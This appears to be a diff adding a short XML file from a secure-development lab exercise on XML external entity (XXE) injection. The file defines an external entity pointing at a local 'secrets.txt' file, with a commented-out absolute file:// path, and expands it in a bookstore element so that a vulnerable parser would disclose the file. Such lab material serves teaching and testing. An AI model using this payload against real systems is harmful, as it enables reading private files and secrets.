@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE replace [
+    <!ENTITY xxe_relative SYSTEM "./secrets.txt" >
+    <!-- <!ENTITY xxe_absolute SYSTEM "file:///home/debian/dev/sandbox/secdev/7_xxe/secrets.txt" > -->
+]>
+<bookstore>&xxe_relative;</bookstore>
+<!-- <bookstore>&xxe_absolute;</bookstore> -->
